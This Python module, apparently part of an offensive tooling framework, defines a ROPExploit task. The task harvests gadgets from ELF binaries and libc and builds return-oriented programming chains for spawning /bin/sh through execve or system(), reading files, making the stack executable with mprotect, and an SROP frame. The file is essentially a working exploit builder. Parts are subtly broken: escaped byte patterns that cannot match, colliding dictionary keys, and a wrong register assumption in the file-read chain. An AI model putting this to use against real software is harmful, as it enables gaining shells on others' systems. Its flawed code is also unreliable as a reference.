from __future__ import annotations
import subprocess
import tempfile
import os
import struct
from typing import Dict, Any, List, Optional, Tuple
from ..core.task import Task

try:
    from pwn import *
    from capstone import *
    PWN_AVAILABLE = True
except ImportError:
    PWN_AVAILABLE = False


class ROPExploit(Task):
    """Advanced ROP (Return-Oriented Programming) chain generator and exploit builder."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.gadgets = []
        self.rop_chain = []
        
    async def validate_params(self) -> None:
        """Validate ROP parameters."""
        if not PWN_AVAILABLE:
            raise ValueError("pwntools is required. Install with: pip install pwntools")
        
        if not self.params.get("binary"):
            raise ValueError("binary parameter is required")
            
        binary_path = self.params["binary"]
        if not os.path.exists(binary_path):
            raise ValueError(f"Binary file not found: {binary_path}")
    
    async def run(self) -> Dict[str, Any]:
        """Generate ROP chains for various exploitation scenarios."""
        await self.validate_params()
        
        binary_path = self.params["binary"]
        chain_type = self.params.get("type", "auto")
        target = self.params.get("target", "/bin/sh")
        libc_path = self.params.get("libc")
        
        results = {
            "binary": binary_path,
            "chain_type": chain_type,
            "status": "analyzing"
        }
        
        try:
            # Load binary
            elf = ELF(binary_path)
            
            # Load libc if provided
            libc = None
            if libc_path and os.path.exists(libc_path):
                libc = ELF(libc_path)
                results["libc"] = libc_path
            
            results["binary_info"] = {
                "arch": elf.arch,
                "bits": elf.bits,
                "nx": elf.nx,
                "pie": elf.pie,
                "canary": elf.canary,
                "relro": elf.relro
            }
            
            self.logger.info(f"Building ROP chains for {elf.arch} {elf.bits}-bit binary")
            
            # Find gadgets
            gadgets = await self._find_comprehensive_gadgets(binary_path, libc_path)
            results["gadget_count"] = len(gadgets)
            results["gadgets"] = gadgets[:50]  # Show first 50 gadgets
            
            # Generate ROP chains based on type
            if chain_type == "execve":
                rop_result = await self._build_execve_chain(elf, gadgets, target, libc)
            elif chain_type == "system":
                rop_result = await self._build_system_chain(elf, gadgets, target, libc)
            elif chain_type == "open_read_write":
                rop_result = await self._build_orw_chain(elf, gadgets, target)
            elif chain_type == "mprotect":
                rop_result = await self._build_mprotect_chain(elf, gadgets)
            elif chain_type == "sigreturn":
                rop_result = await self._build_sigreturn_chain(elf, gadgets)
            else:
                # Auto mode - try multiple chain types
                rop_result = await self._build_auto_chains(elf, gadgets, target, libc)
            
            results.update(rop_result)
            return results
            
        except Exception as e:
            self.logger.error(f"ROP chain generation failed: {e}")
            return {
                "status": "error",
                "error": str(e),
                "binary": binary_path
            }
    
    async def _find_comprehensive_gadgets(self, binary_path: str, libc_path: Optional[str] = None) -> List[Dict[str, Any]]:
        """Find comprehensive ROP gadgets using multiple methods."""
        gadgets = []
        
        # Method 1: Use ROPgadget tool
        gadgets.extend(await self._find_gadgets_ropgadget(binary_path))
        
        # Method 2: Use pwntools ROP
        gadgets.extend(await self._find_gadgets_pwntools(binary_path))
        
        # Method 3: Manual search for specific patterns
        gadgets.extend(await self._find_gadgets_manual(binary_path))
        
        # If libc is provided, find gadgets there too
        if libc_path:
            libc_gadgets = await self._find_gadgets_ropgadget(libc_path)
            # Mark libc gadgets
            for gadget in libc_gadgets:
                gadget["source"] = "libc"
            gadgets.extend(libc_gadgets)
        
        # Remove duplicates and sort by address
        unique_gadgets = []
        seen_addresses = set()
        
        for gadget in gadgets:
            addr = gadget.get("address")
            if addr and addr not in seen_addresses:
                seen_addresses.add(addr)
                unique_gadgets.append(gadget)
        
        return sorted(unique_gadgets, key=lambda x: x.get("address", 0))
    
    async def _find_gadgets_ropgadget(self, binary_path: str) -> List[Dict[str, Any]]:
        """Find gadgets using ROPgadget tool."""
        gadgets = []
        
        try:
            # Find all gadgets
            result = subprocess.run(
                ["ROPgadget", "--binary", binary_path, "--dump"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\\n'):
                    if ':' in line and ('pop' in line or 'ret' in line or 'mov' in line):
                        parts = line.split(':', 1)
                        if len(parts) >= 2:
                            try:
                                addr_str = parts[0].strip()
                                instr = parts[1].strip()
                                
                                addr = int(addr_str, 16)
                                gadgets.append({
                                    "address": addr,
                                    "instruction": instr,
                                    "source": "ropgadget",
                                    "type": self._classify_gadget(instr)
                                })
                            except ValueError:
                                continue
                                
        except (FileNotFoundError, subprocess.TimeoutExpired):
            self.logger.warning("ROPgadget tool not available or timed out")
        
        return gadgets
    
    async def _find_gadgets_pwntools(self, binary_path: str) -> List[Dict[str, Any]]:
        """Find gadgets using pwntools ROP class."""
        gadgets = []
        
        try:
            elf = ELF(binary_path)
            rop = ROP(elf)
            
            for addr, instrs in rop.gadgets.items():
                instr_str = " ; ".join(str(i) for i in instrs)
                gadgets.append({
                    "address": addr,
                    "instruction": instr_str,
                    "source": "pwntools",
                    "type": self._classify_gadget(instr_str)
                })
                
        except Exception as e:
            self.logger.warning(f"Pwntools gadget search failed: {e}")
        
        return gadgets
    
    async def _find_gadgets_manual(self, binary_path: str) -> List[Dict[str, Any]]:
        """Manually search for specific gadget patterns."""
        gadgets = []
        
        try:
            with open(binary_path, 'rb') as f:
                data = f.read()
            
            # Search for common gadget patterns
            patterns = {
                # x86 patterns
                b'\\x58\\xc3': "pop eax ; ret",
                b'\\x5b\\xc3': "pop ebx ; ret", 
                b'\\x59\\xc3': "pop ecx ; ret",
                b'\\x5a\\xc3': "pop edx ; ret",
                b'\\x5e\\xc3': "pop esi ; ret",
                b'\\x5f\\xc3': "pop edi ; ret",
                b'\\x5d\\xc3': "pop ebp ; ret",
                
                # x64 patterns  
                b'\\x5f\\xc3': "pop rdi ; ret",
                b'\\x5e\\xc3': "pop rsi ; ret",
                b'\\x5a\\xc3': "pop rdx ; ret",
                b'\\x58\\xc3': "pop rax ; ret",
                b'\\x59\\xc3': "pop rcx ; ret",
                b'\\x5b\\xc3': "pop rbx ; ret",
                
                # Syscall patterns
                b'\\x0f\\x05': "syscall",
                b'\\xcd\\x80': "int 0x80",
                
                # Other useful patterns
                b'\\xff\\xe4': "jmp esp",
                b'\\xff\\xe0': "jmp eax",
                b'\\x87\\x04\\x24\\xc3': "xchg eax, [esp] ; ret"
            }
            
            elf = ELF(binary_path)
            base_addr = elf.address
            
            for pattern, description in patterns.items():
                offset = 0
                while True:
                    found = data.find(pattern, offset)
                    if found == -1:
                        break
                        
                    gadgets.append({
                        "address": base_addr + found,
                        "instruction": description,
                        "source": "manual",
                        "type": self._classify_gadget(description)
                    })
                    
                    offset = found + 1
                    
        except Exception as e:
            self.logger.warning(f"Manual gadget search failed: {e}")
        
        return gadgets
    
    def _classify_gadget(self, instruction: str) -> str:
        """Classify gadget type based on instruction."""
        instr_lower = instruction.lower()
        
        if "pop" in instr_lower and "ret" in instr_lower:
            return "pop_ret"
        elif "mov" in instr_lower:
            return "mov"
        elif "add" in instr_lower or "sub" in instr_lower:
            return "arithmetic"
        elif "syscall" in instr_lower or "int" in instr_lower:
            return "syscall"
        elif "jmp" in instr_lower or "call" in instr_lower:
            return "control_flow"
        elif "xchg" in instr_lower:
            return "exchange"
        elif "ret" in instr_lower:
            return "ret"
        else:
            return "other"
    
    async def _build_execve_chain(self, elf, gadgets: List[Dict], target: str, libc) -> Dict[str, Any]:
        """Build ROP chain for execve syscall."""
        try:
            self.logger.info(f"Building execve ROP chain for target: {target}")
            
            chain_info = {
                "method": "execve",
                "target": target,
                "status": "building"
            }
            
            if elf.arch == "i386":
                # 32-bit execve: eax=11, ebx=filename, ecx=argv, edx=envp
                required_gadgets = {
                    "pop_eax": self._find_gadget_by_pattern(gadgets, "pop eax"),
                    "pop_ebx": self._find_gadget_by_pattern(gadgets, "pop ebx"),
                    "pop_ecx": self._find_gadget_by_pattern(gadgets, "pop ecx"),
                    "pop_edx": self._find_gadget_by_pattern(gadgets, "pop edx"),
                    "int_80": self._find_gadget_by_pattern(gadgets, "int 0x80")
                }
                
                chain_info["required_gadgets"] = required_gadgets
                
                if all(required_gadgets.values()):
                    # Find or place target string
                    target_addr = self._find_string_in_binary(elf.path, target.encode())
                    if not target_addr:
                        target_addr = 0x804a000  # Example writable address
                        chain_info["note"] = f"Need to write '{target}' to address {hex(target_addr)}"
                    
                    # Build the actual chain
                    rop_chain = [
                        required_gadgets["pop_eax"]["address"],
                        11,  # execve syscall number
                        required_gadgets["pop_ebx"]["address"],
                        target_addr,  # filename
                        required_gadgets["pop_ecx"]["address"],
                        0,  # argv (NULL)
                        required_gadgets["pop_edx"]["address"],
                        0,  # envp (NULL)
                        required_gadgets["int_80"]["address"]
                    ]
                    
                    chain_info["rop_chain"] = [hex(addr) if isinstance(addr, int) and addr > 0x1000 else addr for addr in rop_chain]
                    chain_info["chain_bytes"] = self._chain_to_bytes(rop_chain, elf.bits)
                    chain_info["status"] = "complete"
                else:
                    missing = [k for k, v in required_gadgets.items() if not v]
                    chain_info["status"] = "incomplete"
                    chain_info["missing_gadgets"] = missing
                    
            elif elf.arch == "amd64":
                # 64-bit execve: rax=59, rdi=filename, rsi=argv, rdx=envp
                required_gadgets = {
                    "pop_rax": self._find_gadget_by_pattern(gadgets, "pop rax"),
                    "pop_rdi": self._find_gadget_by_pattern(gadgets, "pop rdi"),
                    "pop_rsi": self._find_gadget_by_pattern(gadgets, "pop rsi"),
                    "pop_rdx": self._find_gadget_by_pattern(gadgets, "pop rdx"),
                    "syscall": self._find_gadget_by_pattern(gadgets, "syscall")
                }
                
                chain_info["required_gadgets"] = required_gadgets
                
                if all(required_gadgets.values()):
                    target_addr = self._find_string_in_binary(elf.path, target.encode())
                    if not target_addr:
                        target_addr = 0x601000  # Example writable address
                        chain_info["note"] = f"Need to write '{target}' to address {hex(target_addr)}"
                    
                    rop_chain = [
                        required_gadgets["pop_rax"]["address"],
                        59,  # execve syscall number
                        required_gadgets["pop_rdi"]["address"],
                        target_addr,  # filename
                        required_gadgets["pop_rsi"]["address"],
                        0,  # argv (NULL)
                        required_gadgets["pop_rdx"]["address"],
                        0,  # envp (NULL)
                        required_gadgets["syscall"]["address"]
                    ]
                    
                    chain_info["rop_chain"] = [hex(addr) if isinstance(addr, int) and addr > 0x1000 else addr for addr in rop_chain]
                    chain_info["chain_bytes"] = self._chain_to_bytes(rop_chain, elf.bits)
                    chain_info["status"] = "complete"
                else:
                    missing = [k for k, v in required_gadgets.items() if not v]
                    chain_info["status"] = "incomplete"
                    chain_info["missing_gadgets"] = missing
            
            return chain_info
            
        except Exception as e:
            return {
                "method": "execve",
                "status": "error",
                "error": str(e)
            }
    
    async def _build_system_chain(self, elf, gadgets: List[Dict], target: str, libc) -> Dict[str, Any]:
        """Build ROP chain for system() call."""
        try:
            self.logger.info(f"Building system ROP chain for: {target}")
            
            chain_info = {
                "method": "system",
                "target": target,
                "status": "building"
            }
            
            # Find system function
            system_addr = None
            if "system" in elf.symbols:
                system_addr = elf.symbols["system"]
            elif libc and "system" in libc.symbols:
                system_addr = libc.symbols["system"]
                chain_info["note"] = "Using libc system address - may need leak"
            
            if not system_addr:
                return {
                    "method": "system",
                    "status": "no_system_function",
                    "error": "system() function not found in binary or libc"
                }
            
            # Find target string
            target_addr = self._find_string_in_binary(elf.path, target.encode())
            if not target_addr and libc:
                target_addr = self._find_string_in_binary(libc.path, target.encode())
            
            if not target_addr:
                target_addr = 0x601000  # Example address
                chain_info["note"] = f"Need to write '{target}' to address {hex(target_addr)}"
            
            if elf.arch == "i386":
                # 32-bit calling convention: push args, call function
                rop_chain = [
                    system_addr,
                    0x41414141,  # return address (dummy)
                    target_addr  # argument to system()
                ]
                
            elif elf.arch == "amd64":
                # 64-bit calling convention: rdi = first arg
                pop_rdi = self._find_gadget_by_pattern(gadgets, "pop rdi")
                
                if not pop_rdi:
                    return {
                        "method": "system",
                        "status": "missing_gadget",
                        "error": "No 'pop rdi' gadget found for x64 calling convention"
                    }
                
                rop_chain = [
                    pop_rdi["address"],
                    target_addr,  # rdi = argument to system()
                    system_addr
                ]
            
            chain_info["system_address"] = hex(system_addr)
            chain_info["target_address"] = hex(target_addr)
            chain_info["rop_chain"] = [hex(addr) if isinstance(addr, int) and addr > 0x1000 else addr for addr in rop_chain]
            chain_info["chain_bytes"] = self._chain_to_bytes(rop_chain, elf.bits)
            chain_info["status"] = "complete"
            
            return chain_info
            
        except Exception as e:
            return {
                "method": "system",
                "status": "error",
                "error": str(e)
            }
    
    async def _build_orw_chain(self, elf, gadgets: List[Dict], filename: str) -> Dict[str, Any]:
        """Build open-read-write ROP chain for file reading."""
        try:
            self.logger.info(f"Building open-read-write chain for: {filename}")
            
            chain_info = {
                "method": "open_read_write",
                "filename": filename,
                "status": "building"
            }
            
            if elf.arch == "amd64":
                # x64 ORW chain
                required_gadgets = {
                    "pop_rax": self._find_gadget_by_pattern(gadgets, "pop rax"),
                    "pop_rdi": self._find_gadget_by_pattern(gadgets, "pop rdi"),
                    "pop_rsi": self._find_gadget_by_pattern(gadgets, "pop rsi"),
                    "pop_rdx": self._find_gadget_by_pattern(gadgets, "pop rdx"),
                    "syscall": self._find_gadget_by_pattern(gadgets, "syscall")
                }
                
                if all(required_gadgets.values()):
                    # Find filename string or use address to write it
                    filename_addr = self._find_string_in_binary(elf.path, filename.encode())
                    if not filename_addr:
                        filename_addr = 0x601000
                        chain_info["note"] = f"Need to write '{filename}' to {hex(filename_addr)}"
                    
                    read_buffer = 0x601100  # Address to read file content
                    
                    rop_chain = [
                        # open(filename, O_RDONLY)
                        required_gadgets["pop_rax"]["address"], 2,  # sys_open
                        required_gadgets["pop_rdi"]["address"], filename_addr,
                        required_gadgets["pop_rsi"]["address"], 0,  # O_RDONLY
                        required_gadgets["syscall"]["address"],
                        
                        # read(fd, buffer, size)
                        required_gadgets["pop_rax"]["address"], 0,  # sys_read
                        # rdi already contains fd from open
                        required_gadgets["pop_rsi"]["address"], read_buffer,
                        required_gadgets["pop_rdx"]["address"], 0x100,  # read size
                        required_gadgets["syscall"]["address"],
                        
                        # write(1, buffer, size)
                        required_gadgets["pop_rax"]["address"], 1,  # sys_write
                        required_gadgets["pop_rdi"]["address"], 1,  # stdout
                        required_gadgets["pop_rsi"]["address"], read_buffer,
                        required_gadgets["pop_rdx"]["address"], 0x100,  # write size
                        required_gadgets["syscall"]["address"]
                    ]
                    
                    chain_info["rop_chain"] = [hex(addr) if isinstance(addr, int) and addr > 0x1000 else addr for addr in rop_chain]
                    chain_info["chain_bytes"] = self._chain_to_bytes(rop_chain, elf.bits)
                    chain_info["status"] = "complete"
                else:
                    missing = [k for k, v in required_gadgets.items() if not v]
                    chain_info["status"] = "incomplete"
                    chain_info["missing_gadgets"] = missing
            
            return chain_info
            
        except Exception as e:
            return {
                "method": "open_read_write",
                "status": "error",
                "error": str(e)
            }
    
    async def _build_mprotect_chain(self, elf, gadgets: List[Dict]) -> Dict[str, Any]:
        """Build mprotect ROP chain to make stack executable."""
        try:
            self.logger.info("Building mprotect ROP chain")
            
            chain_info = {
                "method": "mprotect",
                "status": "building"
            }
            
            if elf.arch == "amd64":
                required_gadgets = {
                    "pop_rax": self._find_gadget_by_pattern(gadgets, "pop rax"),
                    "pop_rdi": self._find_gadget_by_pattern(gadgets, "pop rdi"),
                    "pop_rsi": self._find_gadget_by_pattern(gadgets, "pop rsi"),
                    "pop_rdx": self._find_gadget_by_pattern(gadgets, "pop rdx"),
                    "syscall": self._find_gadget_by_pattern(gadgets, "syscall")
                }
                
                if all(required_gadgets.values()):
                    stack_page = 0x7fffffffe000  # Example stack page
                    page_size = 0x1000
                    rwx_perms = 7  # PROT_READ | PROT_WRITE | PROT_EXEC
                    
                    rop_chain = [
                        # mprotect(stack_page, page_size, PROT_READ|PROT_WRITE|PROT_EXEC)
                        required_gadgets["pop_rax"]["address"], 10,  # sys_mprotect
                        required_gadgets["pop_rdi"]["address"], stack_page,
                        required_gadgets["pop_rsi"]["address"], page_size,
                        required_gadgets["pop_rdx"]["address"], rwx_perms,
                        required_gadgets["syscall"]["address"]
                    ]
                    
                    chain_info["rop_chain"] = [hex(addr) if isinstance(addr, int) and addr > 0x1000 else addr for addr in rop_chain]
                    chain_info["chain_bytes"] = self._chain_to_bytes(rop_chain, elf.bits)
                    chain_info["status"] = "complete"
                    chain_info["note"] = "After mprotect, can place shellcode on stack"
                else:
                    missing = [k for k, v in required_gadgets.items() if not v]
                    chain_info["status"] = "incomplete"
                    chain_info["missing_gadgets"] = missing
            
            return chain_info
            
        except Exception as e:
            return {
                "method": "mprotect",
                "status": "error",
                "error": str(e)
            }
    
    async def _build_sigreturn_chain(self, elf, gadgets: List[Dict]) -> Dict[str, Any]:
        """Build SIGRETURN ROP chain (SROP)."""
        try:
            self.logger.info("Building SIGRETURN ROP chain")
            
            chain_info = {
                "method": "sigreturn",
                "status": "building"
            }
            
            # Find sigreturn gadget
            sigret_gadget = self._find_gadget_by_pattern(gadgets, "syscall")
            
            if sigret_gadget and elf.arch == "amd64":
                # For SROP, we need to control rax=15 (rt_sigreturn) and then syscall
                pop_rax = self._find_gadget_by_pattern(gadgets, "pop rax")
                
                if pop_rax:
                    # Create a fake signal frame
                    # This is simplified - real SROP requires careful frame construction
                    fake_frame = {
                        "rax": 59,  # execve
                        "rdi": 0x601000,  # "/bin/sh" address
                        "rsi": 0,
                        "rdx": 0,
                        "rip": sigret_gadget["address"]  # syscall gadget
                    }
                    
                    chain_info["fake_frame"] = fake_frame
                    chain_info["status"] = "template"
                    chain_info["note"] = "SROP requires precise signal frame construction"
                else:
                    chain_info["status"] = "missing_gadget"
                    chain_info["error"] = "No 'pop rax' gadget found"
            else:
                chain_info["status"] = "not_supported"
                chain_info["error"] = "SROP not supported for this architecture"
            
            return chain_info
            
        except Exception as e:
            return {
                "method": "sigreturn",
                "status": "error",
                "error": str(e)
            }
    
    async def _build_auto_chains(self, elf, gadgets: List[Dict], target: str, libc) -> Dict[str, Any]:
        """Build multiple ROP chains automatically."""
        try:
            self.logger.info("Building multiple ROP chains automatically")
            
            auto_results = {"method": "auto", "chains": {}}
            
            # Try different chain types
            chain_types = ["system", "execve", "open_read_write", "mprotect"]
            
            for chain_type in chain_types:
                try:
                    if chain_type == "system":
                        result = await self._build_system_chain(elf, gadgets, target, libc)
                    elif chain_type == "execve":
                        result = await self._build_execve_chain(elf, gadgets, target, libc)
                    elif chain_type == "open_read_write":
                        result = await self._build_orw_chain(elf, gadgets, "flag.txt")
                    elif chain_type == "mprotect":
                        result = await self._build_mprotect_chain(elf, gadgets)
                    
                    auto_results["chains"][chain_type] = result
                    
                    # If we successfully built a chain, mark it as recommended
                    if result.get("status") == "complete":
                        auto_results["recommended"] = chain_type
                        auto_results["status"] = "chains_available"
                        
                except Exception as e:
                    auto_results["chains"][chain_type] = {
                        "status": "error",
                        "error": str(e)
                    }
            
            if "recommended" not in auto_results:
                auto_results["status"] = "no_complete_chains"
            
            return auto_results
            
        except Exception as e:
            return {
                "method": "auto",
                "status": "error",
                "error": str(e)
            }
    
    def _find_gadget_by_pattern(self, gadgets: List[Dict], pattern: str) -> Optional[Dict]:
        """Find a gadget matching a specific pattern."""
        pattern_lower = pattern.lower()
        
        for gadget in gadgets:
            instr = gadget.get("instruction", "").lower()
            if pattern_lower in instr:
                return gadget
        
        return None
    
    def _find_string_in_binary(self, binary_path: str, search_bytes: bytes) -> Optional[int]:
        """Find a string in the binary and return its address."""
        try:
            elf = ELF(binary_path)
            with open(binary_path, 'rb') as f:
                data = f.read()
                offset = data.find(search_bytes)
                if offset != -1:
                    return elf.address + offset
        except Exception:
            pass
        return None
    
    def _chain_to_bytes(self, chain: List, bits: int) -> str:
        """Convert ROP chain to bytes representation."""
        try:
            chain_bytes = b""
            fmt = "<I" if bits == 32 else "<Q"
            
            for item in chain:
                if isinstance(item, int):
                    chain_bytes += struct.pack(fmt, item)
                else:
                    # Handle non-integer items (shouldn't happen in normal chains)
                    chain_bytes += struct.pack(fmt, 0)
            
            return chain_bytes.hex()
            
        except Exception:
            return "conversion_error"
